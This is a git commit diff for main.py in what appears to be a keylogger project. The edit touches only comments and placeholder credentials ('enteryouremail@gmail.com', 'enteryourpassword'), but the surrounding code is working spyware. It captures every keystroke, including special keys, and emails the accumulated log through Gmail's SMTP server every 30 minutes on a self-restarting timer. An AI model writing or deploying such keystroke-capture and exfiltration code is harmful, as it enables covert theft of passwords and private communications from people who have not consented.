d748be7d2a750ab6c052c6e9bf9753c566dea490
nikhil disale <147905088+nikhildisale@users.noreply.github.com>
2024-10-01 12:28:40 +0530

    Update main.py

--- main.py
+++ main.py
@@ -7,15 +7,15 @@ log = ""
 def callback_function(key):
     global log
     try:
-        log += key.char  # Directly log the character (for letters, numbers, symbols)
+        log += key.char  # Directly log the character like letters, numbers, symbols
     except AttributeError:
         if key == key.space:
             log += " "  # Log spaces
         else:
-            log += " " + str(key) + " "  # Log special characters like Enter, Shift, etc.
+            log += " " + str(key) + " "  # Log special characters like Enter, Shift
 
 def send_email(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)  # Gmail's SMTP server
+    server = smtplib.SMTP("smtp.gmail.com", 587)  # gmails SMTP server
     server.starttls()
     server.login(email, password)
     server.sendmail(email, email, message)
@@ -23,9 +23,9 @@ def send_email(email, password, message):
 
 def send_log():
     global log
-    send_email("youremail@gmail.com", "yourpassword", log)
+    send_email("enteryouremail@gmail.com", "enteryourpassword", log)
     log = ""
-    # Trigger again after 30 minutes
+    # Trigger email again after 30 minutes time frame
     timer = threading.Timer(1800, send_log)
     timer.start()
 
